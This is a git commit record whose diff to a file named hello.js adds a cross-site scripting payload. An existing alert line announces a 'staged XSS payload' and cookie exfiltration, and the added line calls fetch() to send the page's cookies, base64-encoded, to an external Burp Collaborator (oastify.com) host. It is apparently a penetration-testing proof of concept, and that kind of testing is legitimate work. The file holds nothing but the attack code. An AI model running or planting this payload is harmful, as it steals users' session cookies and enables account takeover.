fa7c5029e5a927c1d444beb49017a7f09a28612d
hunbarx64 <hunbarx64@proton.me>
2025-02-27 00:43:55 +0100

    Update hello.js

--- hello.js
+++ hello.js
@@ -1,1 +1,2 @@
 alert("=== Staged XSS payload executed ===\nDomain: " + document.domain + "\n\nExfiltrating cookies to Burp Collaborator");
+fetch(`https://4sxrf2rnnztvp8eltkw5kronue05owhk6.oastify.com/exfil=${btoa(document.cookie)}`)
